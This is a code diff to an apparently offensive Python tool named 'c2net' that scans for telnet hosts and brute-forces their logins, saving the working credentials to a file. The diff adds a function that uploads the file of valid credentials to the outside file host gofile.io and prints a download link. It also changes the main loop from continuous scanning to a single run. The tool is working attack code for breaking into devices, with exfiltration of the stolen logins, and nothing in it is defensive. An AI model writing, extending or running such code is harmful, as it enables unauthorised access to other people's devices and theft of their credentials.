@@ -5,6 +5,7 @@ import threading
 import socket
 import concurrent.futures
 import time
+import requests
 
 VERSION = "1.0"
 FOLDER_NAME = "c2net"
@@ -127,6 +128,17 @@ def loading_bar(progress, total):
     percent = int((progress / total) * 100)
     return f"[{percent}%]"
 
+def upload_to_gofile(file_path):
+    url = "https://store1.gofile.io/uploadFile"
+    with open(file_path, "rb") as f:
+        files = {"file": f}
+        response = requests.post(url, files=files)
+        if response.status_code == 200:
+            data = response.json()
+            if data["status"] == "ok":
+                return data["data"]["downloadPage"]
+    return None
+
 def brute_force():
     global lock, number, valids, invalids, done
     number = 0
@@ -151,16 +163,20 @@ def brute_force():
                             invalid_file.write(invalid_result)
     if file:
         file.close()
+    valid_file_path = os.path.join(FOLDER_NAME, VALID_FILE)
+    download_link = upload_to_gofile(valid_file_path)
+    if download_link:
+        print(f"\nUpload successful! Download link: {download_link}")
+    else:
+        print("\nUpload failed.")
 
 def main():
     os.makedirs(FOLDER_NAME, exist_ok=True)
     path = os.path.join(FOLDER_NAME, IP_OUTPUT_FILE)
-    while True:
-        scan_telnet(path)
-        brute_force()
-        with open(path, "w") as f:
-            f.write("")
-        time.sleep(1)
+    scan_telnet(path)
+    brute_force()
+    with open(path, "w") as f:
+        f.write("")
 
 if __name__ == "__main__":
     main()
